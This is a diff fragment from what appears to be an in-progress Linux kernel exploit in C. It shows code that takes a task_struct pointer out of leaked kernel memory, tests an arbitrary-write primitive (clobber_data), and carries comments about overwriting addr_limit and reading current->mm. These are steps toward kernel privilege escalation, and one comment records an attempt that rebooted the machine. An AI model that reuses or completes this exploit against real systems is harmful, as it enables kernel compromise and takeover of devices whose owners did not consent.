@@ -323,9 +323,11 @@ int main(int argc, char** argv) {
   }
   if (leakSize >= 0xe8 + 0x8) {
       memcpy(&current_ptr, leaked+0xe8, 8);
+      // current_ptr points to struct task_struct 
+      // TODO: unfortunately on 3.18 this does not have thread_info in it, so we'll need to find a way to leak the kernel stack
       printf("current_ptr = %lx\n", (unsigned long)current_ptr);
       printf("my stack = %lx\n", (unsigned long)&leakSize);
-      printf("Clobbering addr_limit\n");
+      //printf("Clobbering addr_limit\n");
       unsigned long const src=0xFFFFFFFFFFFFFFFEul;
 /*      unsigned char z = 0xFF;
       clobber_data(current_ptr+8+7, &z, 1); // REBOOTS!
@@ -335,6 +337,7 @@ int main(int argc, char** argv) {
       unsigned long datum;
       clobber_data((unsigned long)&datum, &src, sizeof(datum));
       printf("wrote = %lx\n", (unsigned long)datum);
+
       //unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
       //printf("current->mm == 0x%lx\n", current_mm);
   }
